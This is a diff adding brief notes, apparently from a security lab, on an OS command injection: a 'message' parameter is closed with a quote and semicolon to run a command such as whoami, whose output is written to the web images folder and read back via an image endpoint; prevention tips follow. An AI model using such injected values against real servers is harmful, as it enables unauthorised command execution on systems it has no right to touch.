@@ -1,0 +1,19 @@
+Vulnerability:
+	TThe server passes user input directly into a shell command without validating or sanitizing it,
+	Allowing an attacker to inject commands and view the output—even if it's not reflected directly.
+	
+Exploit:
+	Inject double quotes and a semicolon, add your command, redirect the output to a file, then access it using the image load endpoint:
+		&message=mishmash";[PAYLOAD]+>+[PATH]/[FILE]"
+	
+Example:
+	Inject:
+		 ...
+		 &message=mishmash";whoami+>+/var/www/images/my_command.txt"
+		 
+	Access:
+		https://server.net/image?filename=my_command.txt
+	
+Prevention:
+	- Disallow or escape double quotes and other special shell characters in input.
+	- Restrict file loading to only valid image extensions.
